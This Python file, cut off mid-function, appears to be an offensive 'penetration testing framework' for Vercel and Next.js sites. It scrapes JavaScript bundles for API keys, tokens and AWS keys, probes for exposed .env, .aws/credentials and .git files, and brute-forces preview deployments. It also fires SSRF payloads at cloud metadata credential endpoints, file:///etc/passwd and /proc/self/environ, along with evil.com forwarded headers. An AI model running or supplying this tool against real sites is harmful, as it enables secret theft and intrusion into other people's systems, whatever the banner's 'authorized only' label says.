#!/usr/bin/python3
# -*-coding:utf-8-*-
"""
VercelStrike — Advanced Vercel Penetration Testing Framework
Author: HackerAI / Cybersecurity Professional
Version: 2.0 — Aggressive Multi-Vector Assessment Tool
Usage:  python3 vercelstrike.py -t https://target.vercel.app
"""

import os, sys, json, re, time, subprocess, urllib.parse, hashlib, random, base64, socket, ssl
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, quote, unquote
from collections import defaultdict

# ═══════════════════════════════════════════════════════════════
# ANSI & STYLING
# ═══════════════════════════════════════════════════════════════
R = '\033[1;91m'; G = '\033[1;92m'; Y = '\033[1;93m'
B = '\033[1;94m'; M = '\033[1;95m'; C = '\033[1;96m'
W = '\033[1;97m'; Z = '\033[1;90m'; N = '\033[0m'
BOLD = '\033[1m'; DIM = '\033[2m'; BLINK = '\033[5m'
CHECK = f'{G}[✓]{N}'; CROSS = f'{R}[✗]{N}'
INFO = f'{B}[i]{N}'; WARN = f'{Y}[!]{N}'; CRIT = f'{R}[!!!]{N}'
SKULL = f'{R}☠{N}'

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
OUTPUT_DIR = None
THREADS = 50
TIMEOUT = 15
TARGET_URL = ""
TARGET_DOMAIN = ""
SCHEME = "https"
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
]

# ═══════════════════════════════════════════════════════════════
# TOOL PATHS & DETECTION
# ═══════════════════════════════════════════════════════════════
TOOLS = {}

def detect_tools():
    """Detect available external tools on the system"""
    tools_list = {
        'curl': 'curl', 'wget': 'wget', 'git': 'git', 'jq': 'jq',
        'ffuf': 'ffuf', 'gobuster': 'gobuster', 'nuclei': 'nuclei',
        'nikto': 'nikto', 'nmap': 'nmap', 'whatweb': 'whatweb',
        'wappalyzer': 'wappalyzer', 'trufflehog': 'trufflehog',
        'gitleaks': 'gitleaks', 'subfinder': 'subfinder',
        'httpx': 'httpx', 'katana': 'katana', 'feroxbuster': 'feroxbuster',
        'dirsearch': 'dirsearch',
    }
    for name, cmd in tools_list.items():
        r = subprocess.run(f"which {cmd}", shell=True, capture_output=True, text=True)
        TOOLS[name] = r.returncode == 0
    return TOOLS

def has_tool(name):
    return TOOLS.get(name, False)

# ═══════════════════════════════════════════════════════════════
# UTILITY
# ═══════════════════════════════════════════════════════════════
def run(cmd, timeout=30, silent=True):
    """Run shell command with timeout"""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out, err, rc = r.stdout, r.stderr, r.returncode
        return out.strip() if out else "", err.strip() if err else "", rc
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -2

def curl(url, headers=None, method="GET", data=None, allow_redirects=True, raw=False):
    """Advanced curl wrapper"""
    ua = random.choice(USER_AGENTS)
    cmd = f"curl -s -L -m {TIMEOUT} -A '{ua}'"
    if not allow_redirects:
        cmd = cmd.replace(" -L", "")
    if method == "HEAD":
        cmd += " -I"
    elif method == "POST":
        cmd += f" -X POST -d '{quote(data)}'" if data else " -X POST"
    elif method == "OPTIONS":
        cmd += " -X OPTIONS"
    if headers:
        for k, v in headers.items():
            cmd += f" -H '{k}: {v}'"
    cmd += f" -w '\\n%{{http_code}}\\n%{{size_download}}\\n%{{content_type}}' '{url}'"
    
    out, err, rc = run(cmd, timeout=TIMEOUT)
    if not out:
        return {"code": "000", "body": "", "size": "0", "type": "", "error": err}
    
    lines = out.split('\n')
    code = lines[-3] if len(lines) >= 3 else "000"
    size = lines[-2] if len(lines) >= 2 else "0"
    ctype = lines[-1] if len(lines) >= 1 else ""
    body = '\n'.join(lines[:-3]) if len(lines) > 3 else ""
    
    return {"code": code, "body": body, "size": size, "type": ctype}

def log(phase, data, target_slug=None):
    """Log finding to JSON"""
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    target = target_slug or TARGET_DOMAIN
    logfile = f"{OUTPUT_DIR}/{target}/{phase}.json"
    os.makedirs(f"{OUTPUT_DIR}/{target}", exist_ok=True)
    existing = []
    if os.path.exists(logfile):
        try:
            with open(logfile) as f: existing = json.load(f)
        except: existing = []
    existing.append({"ts": ts, "data": data})
    with open(logfile, 'w') as f:
        json.dump(existing, f, indent=2)

def save_finding(phase, finding_type, severity, title, description, evidence, target_slug=None):
    """Save a structured finding with severity"""
    finding = {
        "type": finding_type, "severity": severity,
        "title": title, "description": description,
        "evidence": str(evidence)[:500] if evidence else "",
        "timestamp": datetime.now().isoformat()
    }
    log(phase, finding, target_slug)
    sev_color = {'CRITICAL': R, 'HIGH': M, 'MEDIUM': Y, 'LOW': C, 'INFO': B}
    color = sev_color.get(severity, W)
    print(f"  {color}[{severity:8s}]{N} {title}")

# ═══════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════
def banner():
    os.system("clear")
    print(f"""{R}
    ╔══════════════════════════════════════════════════════════════╗
    ║  {W}██╗   ██╗███████╗██████╗  ██████╗███████╗██╗     ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗{R}║
    ║  {W}██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██║     ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝{R}║
    ║  {W}██║   ██║█████╗  ██████╔╝██║     █████╗  ██║     ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  {R}║
    ║  {W}╚██╗ ██╔╝██╔══╝  ██╔══██╗██║     ██╔══╝  ██║     ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  {R}║
    ║  {W} ╚████╔╝ ███████╗██║  ██║╚██████╗███████╗███████╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗{R}║
    ║  {W}  ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝{R}║
    ║{W}  ╔══════════════════════════════════════════════════════════════════════════════════════╗{R}║
    ║{W}  ║       {R}Advanced Vercel / Next.js Penetration Testing Framework v2.0{W}                    ║{R}║
    ║{W}  ║       {Z}Author: HackerAI  |  {G}Authorized Pentesting Only{W}                              ║{R}║
    ║{W}  ╚══════════════════════════════════════════════════════════════════════════════════════╝{R}║
    ╚══════════════════════════════════════════════════════════════╝{N}
    """)

# ═══════════════════════════════════════════════════════════════
# PHASE 0: INITIAL SETUP & TARGET ANALYSIS
# ═══════════════════════════════════════════════════════════════
def phase0_setup(url):
    """Parse and validate target, detect platform"""
    global TARGET_URL, TARGET_DOMAIN, SCHEME, OUTPUT_DIR
    
    if not url.startswith("http"):
        url = "https://" + url
    TARGET_URL = url
    parsed = urlparse(url)
    TARGET_DOMAIN = parsed.netloc
    SCHEME = parsed.scheme
    
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    OUTPUT_DIR = f"vercelstrike_{TARGET_DOMAIN}_{ts}"
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    print(f"\n{B}╔{'═'*60}╗{N}")
    print(f"{B}║{W} TARGET:          {G}{TARGET_URL}{N}")
    print(f"{B}║{W} DOMAIN:          {C}{TARGET_DOMAIN}{N}")
    print(f"{B}║{W} OUTPUT:          {Y}{OUTPUT_DIR}/{N}")
    print(f"{B}║{W} THREADS:         {M}{THREADS}{N}")
    print(f"{B}║{W} TOOLS DETECTED:  ", end="")
    detected = [k for k, v in TOOLS.items() if v]
    print(f"{G}{len(detected)}/{len(TOOLS)}{N}")
    for t in detected:
        print(f"{B}║{W}                  {G}✔{N} {t}")
    print(f"{B}╚{'═'*60}╝{N}\n")
    
    # Detect platform
    r = curl(url, method="HEAD")
    body = r.get("body", "")
    
    # Check for Vercel indicators
    vercel_indicators = [
        'vercel', 'x-vercel', 'server: Vercel', 
        'x-powered-by: Vercel', 'x-vercel-id',
        '_next/static', '__NEXT_DATA__', 'nextjs'
    ]
    
    found_indicators = []
    for ind in vercel_indicators:
        if ind.lower() in body.lower():
            found_indicators.append(ind)
    
    head_result = curl(url, method="HEAD")
    head_body = head_result.get("body", "")
    for ind in vercel_indicators:
        if ind.lower() in head_body.lower():
            found_indicators.append(ind)
    
    if found_indicators:
        platform = "Vercel (Next.js)"
        print(f" {G}[+] Platform: {platform}{N}")
    elif any(s in url for s in ['.vercel.app', 'vercel.app']):
        platform = "Vercel (Next.js)"
        print(f" {G}[+] Platform: {platform} (vercel.app domain){N}")
    else:
        platform = "Unknown"
        print(f" {Y}[~] Platform: Unknown (not a .vercel.app domain){N}")
    
    return platform

# ═══════════════════════════════════════════════════════════════
# PHASE 1: AGGRESSIVE RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════
def phase1_recon():
    """Extreme recon — headers, tech, source, JS analysis"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 1: AGGRESSIVE RECONNAISSANCE{W}")
    print(f"{R}{'═'*60}{N}\n")
    findings = {}
    
    # 1.1 Full HTTP headers + response analysis
    print(f" {B}[1.1]{N} Full HTTP fingerprinting...")
    r = curl(TARGET_URL, method="HEAD")
    save_finding("01_recon", "headers", "INFO", f"HTTP Headers captured ({r['code']})", 
                 f"Response: {r['code']} | Size: {r['size']} | Type: {r['type']}", r)
    
    # 1.2 Vercel-specific header checks
    print(f" {B}[1.2]{N} Vercel header fingerprinting...")
    out, _, _ = run(f"curl -s -I -m {TIMEOUT} '{TARGET_URL}'")
    vercel_headers = ['x-vercel-id', 'x-vercel-cache', 'x-vercel-region', 
                      'x-vercel-execution-region', 'x-vercel-proxy-signature',
                      'server', 'x-powered-by']
    for h in vercel_headers:
        match = re.search(rf'^{re.escape(h)}:\s*(.+)', out, re.I | re.M)
        if match:
            print(f"   {G}[+]{N} {h}: {Z}{match.group(1)}{N}")
            save_finding("01_recon", "vercel_header", "INFO", f"Vercel header: {h}", match.group(1), out)
    
    # 1.3 Full page source extraction + deep analysis
    print(f" {B}[1.3]{N} Deep page source analysis...")
    r = curl(TARGET_URL)
    body = r.get("body", "")
    
    # Extract __NEXT_DATA__ (SSR payload with env vars, build ID, etc.)
    next_data = re.search(r'<script id="__NEXT_DATA__"[^>]*type="application/json"[^>]*>(.*?)</script>', body, re.DOTALL)
    if next_data:
        try:
            nd = json.loads(next_data.group(1))
            build_id = nd.get('buildId', 'unknown')
            props = nd.get('props', {})
            page_props = props.get('pageProps', {})
            print(f"   {G}[+]{N} Build ID: {Y}{build_id}{N}")
            print(f"   {G}[+]{N} Page props: {Y}{len(json.dumps(page_props))} bytes{N}")
            save_finding("01_recon", "next_data", "INFO", f"Next.js __NEXT_DATA__ found", 
                        f"BuildID: {build_id}", json.dumps(nd)[:1000])
            
            # Check for env vars leaked in SSR
            nd_str = json.dumps(nd)
            env_leaks = re.findall(r'(?i)(?:api_key|token|secret|password|key)["\']\s*[:=]\s*["\']([^"\']{10,})', nd_str)
            for leak in env_leaks:
                print(f"   {R}[!] POTENTIAL SECRET IN SSR: {leak[:30]}...{N}")
                save_finding("01_recon", "ssr_secret_leak", "HIGH", "Secret leaked in SSR payload", 
                            f"Pattern: {leak[:50]}", f"Found in __NEXT_DATA__")
        except:
            pass
    
    # 1.4 JS Bundle extraction and analysis
    print(f" {B}[1.4]{N} JS bundle extraction...")
    js_urls = re.findall(r'<script[^>]*src=["\']([^"\']+\.(?:js|jsx))["\']', body)
    js_urls.extend(re.findall(r'(/_next/static/[^"\']+)', body))
    js_urls = list(set([u if u.startswith('http') else f"{TARGET_URL.rstrip('/')}/{u.lstrip('/')}" for u in js_urls]))
    
    print(f"   {G}[+]{N} Found {len(js_urls)} JS bundles")
    
    # Download and scan bundles for secrets
    bundle_secrets = []
    def scan_bundle(js_url):
        r2 = curl(js_url)
        js_body = r2.get("body", "")
        if len(js_body) > 100:
            # Search for hardcoded secrets
            patterns = [
                (r'(?i)(?:NEXT_PUBLIC_)([A-Z_]+)\s*[=:]\s*["\']([^"\']+)["\']', 'Next.js Public Env'),
                (r'(?i)(?:api[_-]?key|apikey)["\s:=]+["\']?([A-Za-z0-9_\-]{16,})["\']?', 'API Key'),
                (r'AKIA[0-9A-Z]{16}', 'AWS Key'),
                (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}', 'JWT Token'),
                (r'sk-[A-Za-z0-9]{20,}', 'OpenAI Key'),
                (r'(?i)(?:password|passwd|pwd|secret)["\s:=]+["\']?([^"\'\s]{8,})["\']?', 'Generic Secret'),
                (r'(?i)VERCEL_[A-Z_]+["\s:=]+["\']?([^"\'\s]+)["\']?', 'Vercel Env Var'),
                (r'(?i)SENDGRID|TWILIO|STRIPE|MONGO|MYSQL|POSTGRES|DATABASE_URL["\s:=]', 'DB/Service URL'),
            ]
            for pat, label in patterns:
                matches = re.findall(pat, js_body)
                for m in matches[:3]:
                    val = m[-1] if isinstance(m, tuple) else m
                    bundle_secrets.append({"file": js_url.split('/')[-1][:30], "type": label, "value": val[:40]})
                    print(f"   {R}[!] {label}: {Z}{val[:30]}...{N} in {js_url.split('/')[-1][:20]}")
            return len(js_body)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        sizes = list(ex.map(scan_bundle, js_urls[:30]))
    
    if bundle_secrets:
        save_finding("01_recon", "bundle_secrets", "HIGH", f"Secrets in JS bundles ({len(bundle_secrets)})", 
                    "Hardcoded credentials in client-side code", str(bundle_secrets))
    
    # 1.5 Directory/file discovery via source enumeration
    print(f" {B}[1.5]{N} Source-embedded path discovery...")
    paths = set()
    # Find all href/src/action references
    for pat in [r'href=["\']([^"\']+)["\']', r'src=["\']([^"\']+)["\']', r'action=["\']([^"\']+)["\']']:
        for m in re.findall(pat, body):
            p = m.split('?')[0].split('#')[0]
            if p.startswith('/') and not p.startswith('//'):
                paths.add(p)
    
    interesting = [p for p in paths if any(x in p.lower() for x in 
                   ['api', 'admin', 'panel', 'dashboard', 'config', 'backup', 
                    'secret', 'token', 'login', 'auth', 'login', 'signin',
                    'debug', 'test', 'dev', 'staging', 'internal', 'private',
                    '.env', '.git', 'swagger', 'docs', 'graphql', 'socket',
                    'webhook', 'callback', 'upload', 'download', 'export'])]
    
    print(f"   {G}[+]{N} Total unique paths: {len(paths)}")
    print(f"   {G}[+]{N} Interesting paths: {len(interesting)}")
    for p in interesting[:15]:
        print(f"   {Y}[~]{N} {p}")
    
    if interesting:
        save_finding("01_recon", "interesting_paths", "MEDIUM", f"Interesting paths ({len(interesting)})",
                    "Potentially sensitive endpoints found in source", str(interesting[:20]))
    
    # 1.6 Wappalyzer / whatweb tech detection
    if has_tool('whatweb'):
        print(f" {B}[1.6]{N} WhatWeb technology detection...")
        out, _, _ = run(f"whatweb -a 3 '{TARGET_URL}' 2>/dev/null", timeout=30)
        print(f"   {out[:500]}")
        save_finding("01_recon", "whatweb", "INFO", "Technology detected via WhatWeb", out[:500], out)
    
    print(f"\n {G}[✓] Phase 1 complete — {len(findings)} categories{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 2: VERCELL-SPECIFIC VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════
def phase2_vercel_specific():
    """Targeted Vercel-specific vulnerability scanning"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 2: VERCELL-SPECIFIC VULNERABILITY SCAN{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    # 2.1 Check for exposed /api routes
    print(f" {B}[2.1]{N} API route enumeration...")
    common_api_routes = [
        "api", "api/health", "api/status", "api/v1", "api/v2",
        "api/users", "api/auth", "api/login", "api/config",
        "api/env", "api/environment", "api/keys", "api/debug",
        "api/graphql", "api/rest", "api/webhook", "api/callback",
        "api/search", "api/query", "api/data", "api/info",
        "api/admin", "api/internal", "api/private",
        "api/logs", "api/metrics", "api/trace",
        "api/__info", "api/__debug", "api/__health",
    ]
    
    api_responses = []
    def check_api(route):
        url = f"{TARGET_URL}/{route}" if not route.startswith("api/") else f"{TARGET_URL}/{route}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        if code not in ("404", "000", "301", "302", "307"):
            size = r.get("size", "0")
            body_preview = r.get("body", "")[:100]
            api_responses.append({"route": route, "code": code, "size": size, "preview": body_preview})
            return (route, code, size, body_preview)
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        results = list(ex.map(check_api, common_api_routes))
    
    live_apis = [r for r in results if r]
    if live_apis:
        print(f"   {R}[!]{N} Found {len(live_apis)} accessible API endpoints!")
        for route, code, size, preview in live_apis:
            print(f"   {R}[{code}]{N} /{route} ({size}B)")
            if preview:
                print(f"     {Z}{preview}{N}")
        save_finding("02_vercel", "api_routes", "MEDIUM", f"Accessible API routes ({len(live_apis)})",
                    "API endpoints accessible without auth", str(live_apis))
    else:
        print(f"   {G}[✓]{N} No unprotected API routes found")
    
    # 2.2 Check for .env and config exposure
    print(f" {B}[2.2]{N} Environment/config file probing...")
    config_paths = [
        ".env", ".env.local", ".env.production", ".env.development",
        ".env.example", ".env.sample",
        "vercel.json", "next.config.js", "next.config.mjs",
        "package.json", "tsconfig.json", "nuxt.config.js",
        "firebase.json", "firebase.config.js",
        "netlify.toml", "now.json",
        "config.json", "config.js", "config.ts",
        "app.config.js", "app.config.ts",
        "serverless.yml", "serverless.json",
        "docker-compose.yml", "Dockerfile",
        ".git/config", ".git/HEAD", ".gitignore",
        ".aws/config", ".aws/credentials",
        ".npmrc", ".yarnrc",
        "credentials.json", "key.json", "service-account.json",
        "robots.txt", "sitemap.xml", "security.txt",
        "crossdomain.xml", "clientaccesspolicy.xml",
        "_next/static/__BUILD_ID", "_next/static/__buildManifest",
    ]
    
    config_finds = []
    def check_config(path):
        url = f"{TARGET_URL}/{path}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        size = r.get("size", "0")
        if code not in ("404", "000", "301", "302", "307"):
            body = r.get("body", "")[:200]
            config_finds.append({"path": path, "code": code, "size": size})
            return (path, code, size, body)
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        results = list(ex.map(check_config, config_paths))
    
    live_configs = [r for r in results if r]
    if live_configs:
        print(f"   {R}[!]{N} Found {len(live_configs)} exposed config files!")
        for path, code, size, body in live_configs:
            print(f"   {R}[{code}]{N} {path} ({size}B)")
            if body and path not in ('vercel.json', 'package.json'):
                print(f"     {Z}{body[:150]}{N}")
        save_finding("02_vercel", "config_exposure", "HIGH", f"Exposed config files ({len(live_configs)})",
                    "Sensitive files accessible on server", str(live_configs))
    else:
        print(f"   {G}[✓]{N} No config files exposed")
    
    # 2.3 Preview deployment enumeration
    print(f" {B}[2.3]{N} Preview deployment enumeration...")
    if '.vercel.app' in TARGET_DOMAIN:
        project_name = TARGET_DOMAIN.replace('.vercel.app', '')
        
        # Common preview patterns
        preview_patterns = [
            f"https://{project_name}-git-main.{project_name}.vercel.app",
            f"https://{project_name}-git-develop.{project_name}.vercel.app",
            f"https://{project_name}-git-staging.{project_name}.vercel.app",
            f"https://{project_name}-7hn4a4f5a.{project_name}.vercel.app",
            f"https://{project_name}-dev.{project_name}.vercel.app",
            f"https://{project_name}-preview.{project_name}.vercel.app",
            f"https://{project_name}-staging.{project_name}.vercel.app",
            f"https://{project_name}-test.{project_name}.vercel.app",
            f"https://{project_name}-prod.{project_name}.vercel.app",
        ]
        
        preview_finds = []
        for pp in preview_patterns:
            r = curl(pp, allow_redirects=False)
            code = r.get("code", "000")
            if code not in ("404", "000"):
                size = r.get("size", "0")
                preview_finds.append({"url": pp, "code": code, "size": size})
                print(f"   {Y}[{code}]{N} {pp}")
        
        if preview_finds:
            save_finding("02_vercel", "preview_deployments", "MEDIUM", f"Preview deployments ({len(preview_finds)})",
                        "Alternative Vercel deployments with potential different env vars", str(preview_finds))
        
        # Brute-force git branch-based preview URLs
        print(f"   {B}[2.3b]{N} Git branch preview brute-force...")
        common_branches = ["main", "master", "develop", "staging", "dev", "production",
                          "feature", "fix", "hotfix", "release", "test", "deploy",
                          "update", "upgrade", "patch", "chore", "refactor"]
        
        branch_finds = []
        def check_branch(branch):
            sanitized = re.sub(r'[^a-zA-Z0-9\-]', '-', branch)
            url = f"https://{project_name}-git-{sanitized}.{project_name}.vercel.app"
            r = curl(url, allow_redirects=False)
            code = r.get("code", "000")
            if code not in ("404", "000"):
                return (url, code, r.get("size", "0"))
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
            results = list(ex.map(check_branch, common_branches))
        
        branch_finds = [r for r in results if r]
        for url, code, size in branch_finds:
            print(f"   {Y}[{code}]{N} {url}")
        
        if branch_finds:
            save_finding("02_vercel", "preview_branches", "MEDIUM", f"Branch previews ({len(branch_finds)})",
                        "Git branch-based preview deployments exposed", str(branch_finds))
    else:
        print(f"   {Z}~ Not a .vercel.app domain, skipping{N}")
    
    # 2.4 Check for Vercel Functions tab / logs exposure
    print(f" {B}[2.4]{N} Serverless function probing...")
    function_paths = [
        "api/__funcs", "api/__functions", "api/__debug",
        "_next/static/__buildId", "_next/static/__BUILD_ID",
        "__nextjs_original-stack-frame",
        "__logs", "__debug", "__monitor", "__health",
        "favicon.ico", "robots.txt",
        ".well-known/security.txt", ".well-known/assetlinks.json",
    ]
    
    for path in function_paths:
        url = f"{TARGET_URL}/{path}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        if code not in ("404", "000"):
            print(f"   {Y}[{code}]{N} {path}")
    
    # 2.5 WebSocket upgrade SSRF test (CVE-2026-44578)
    print(f" {B}[2.5]{N} WebSocket SSRF test (CVE-2026-44578)...")
    # Only works on self-hosted Next.js, but test anyway
    import socket as sock_module
    try:
        host = TARGET_DOMAIN
        port = 443 if SCHEME == "https" else 80
        
        # Create raw WebSocket upgrade request
        ws_req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        try:
            sock = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_STREAM)
            sock.settimeout(5)
            if port == 443:
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.send(ws_req.encode())
            resp = sock.recv(4096).decode(errors='ignore')
            sock.close()
            
            if '101' in resp[:30]:
                print(f"   {R}[!] WebSocket upgrade ACCEPTED (101 Switching Protocols)")
                save_finding("02_vercel", "websocket_upgrade", "HIGH", "WebSocket upgrade accepted",
                           "Possible SSRF vector (CVE-2026-44578) if self-hosted", resp[:500])
            else:
                print(f"   {G}[✓]{N} WebSocket upgrade rejected — safe")
        except Exception as e:
            print(f"   {Z}~ WebSocket test: {str(e)[:50]}{N}")
    except:
        pass
    
    # 2.6 Source map exposure
    print(f" {B}[2.6]{N} Source map exposure check...")
    # Try to find build ID first
    build_id = None
    r = curl(TARGET_URL)
    nd_match = re.search(r'"buildId"\s*:\s*"([^"]+)"', r.get("body", ""))
    if nd_match:
        build_id = nd_match.group(1)
    
    if build_id:
        sourcemap_paths = [
            f"/_next/static/{build_id}/_buildManifest.js",
            f"/_next/static/{build_id}/_ssgManifest.js",
            f"/_next/static/{build_id}/_middlewareManifest.js",
            f"/_next/static/chunks/pages/_app-{build_id}.js",
            f"/_next/static/chunks/pages/_error-*.js",
            f"/_next/static/css/*.css",
        ]
        for sm in sourcemap_paths:
            url = f"{TARGET_URL}{sm.replace('*', 'aaaaaaaa')}"
            r2 = curl(url, allow_redirects=False)
            if r2.get("code") not in ("404", "000"):
                print(f"   {Y}[{r2['code']}]{N} {sm}")
    
    # Check for .map files
    js_urls_from_source = re.findall(r'(/_next/static/[^"\']+\.js)', r.get("body", "") if r else "")
    for js in list(set(js_urls_from_source))[:5]:
        map_url = f"{TARGET_URL}{js}.map"
        r2 = curl(map_url, allow_redirects=False)
        if r2.get("code") == "200":
            map_size = r2.get("size", "0")
            print(f"   {R}[!] SOURCE MAP EXPOSED: {js}.map ({map_size}B)")
            save_finding("02_vercel", "sourcemap_exposure", "HIGH", "Source map exposed",
                        f"{js}.map exposes full source code to attackers", 
                        f"Size: {map_size}B, URL: {map_url}")
    
    print(f"\n {G}[✓] Phase 2 complete{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 3: CVE & VULNERABILITY EXPLOITATION
# ═══════════════════════════════════════════════════════════════
def phase3_cve_exploitation():
    """Check for and attempt exploitation of known CVEs"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 3: CVE & VULNERABILITY EXPLOITATION{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    # 3.1 Next.js Version Detection
    print(f" {B}[3.1]{N} Next.js version detection...")
    version_hints = []
    
    # Check __NEXT_DATA__
    r = curl(TARGET_URL)
    body = r.get("body", "")
    
    # Check build manifest
    build_manifest_url = re.search(r'(/_next/static/[^/]+/_buildManifest\.js)', body)
    if build_manifest_url:
        full_url = f"{TARGET_URL}{build_manifest_url.group(1)}"
        r2 = curl(full_url)
        manifest_body = r2.get("body", "")
        # Sometimes version is embedded
        ver_match = re.search(r'["\']?version["\']?["\s:]+["\']?([\d.]+)["\']?', manifest_body)
        if ver_match:
            version_hints.append(ver_match.group(1))
    
    # Check package.json if exposed
    r3 = curl(f"{TARGET_URL}/package.json", allow_redirects=False)
    if r3.get("code") == "200":
        try:
            pkg = json.loads(r3.get("body", "{}"))
            if "dependencies" in pkg:
                nx_ver = pkg["dependencies"].get("next", "")
                if nx_ver:
                    version_hints.append(nx_ver.replace("^", "").replace("~", ""))
        except:
            pass
    
    # Check _next/static path for build ID patterns that reveal version
    next_static_match = re.search(r'/_next/static/([^/]+)/', body)
    if next_static_match:
        build_hash = next_static_match.group(1)
        print(f"   {INFO} Build hash: {build_hash}")
    
    if version_hints:
        print(f"   {G}[+]{N} Next.js version hint(s): {Y}{', '.join(version_hints)}{N}")
    else:
        print(f"   {Z}~ Could not determine exact version{N}")
    
    # 3.2 Check CVE-2025-57822 (Middleware SSRF)
    print(f" {B}[3.2]{N} Middleware SSRF check (CVE-2025-57822)...")
    # Test by sending X-Forwarded-For and similar headers
    ssrf_headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Forwarded-Host": "evil.com",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "evil.com",
        "X-Forwarded-Server": "evil.com",
        "Forwarded": "for=127.0.0.1;host=evil.com;proto=https",
    }
    
    for header, value in ssrf_headers.items():
        url = f"{TARGET_URL}/api/health"
        r = curl(url, headers={header: value})
        body_snippet = r.get("body", "")[:200]
        if "error" in body_snippet.lower() or "internal" in body_snippet.lower():
            print(f"   {Y}[!]{N} Possible SSRF via {header}: {value}")
            save_finding("03_cve", "ssrf_test", "MEDIUM", f"Potential SSRF via {header}",
                        "Middleware may reflect user-controlled headers (CVE-2025-57822)",
                        f"Header: {header}: {value}")
        else:
            print(f"   {Z}~ {header}: {r.get('code','?')}{N}")
    
    # 3.3 SSRF via /api/ proxies (common Vercel pattern)
    print(f" {B}[3.3]{N} API proxy SSRF testing...")
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:3000/",
        "http://127.0.0.1:8080/",
        "http://[::1]:3000/",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "http://0.0.0.0:3000/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "https://api.ipify.org",
    ]
    
    # Try common SSRF patterns against detected API routes
    api_routes_found = []
    # Read from previous phase findings
    api_findings_file = f"{OUTPUT_DIR}/{TARGET_DOMAIN}/02_vercel.json"
    if os.path.exists(api_findings_file):
        try:
            with open(api_findings_file) as f:
                api_data = json.load(f)
                for entry in api_data:
                    d = entry.get("data", {})
                    if d.get("type") == "api_routes":
                        for route_data in d.get("evidence", "").split("], [")[0].split("},"):
                            route_match = re.search(r"'route': '([^']+)'", route_data)
                            if route_match:
                                api_routes_found.append(route_match.group(1))
        except:
            pass
    
    # Generic SSRF attempts
    for ssrf_target in ssrf_targets:
        encoded = quote(ssrf_target, safe='')
        test_urls = [
            f"{TARGET_URL}/api/fetch?url={encoded}",
            f"{TARGET_URL}/api/proxy?url={encoded}",
            f"{TARGET_URL}/api/image?url={encoded}",
            f"{TARGET_URL}/api/load?url={encoded}",
            f"{TARGET_URL}/api/redirect?url={encoded}",
            f"{TARGET_URL}/api/request?url={encoded}",
            f"{TARGET_URL}/api/check?url={encoded}",
            f"{TARGET_URL}/api/data?url={encoded}",
            f"{TARGET_URL}/api/external?url={encoded}",
            f"{TARGET_URL}/api/screenshot?url={encoded}",
        ]
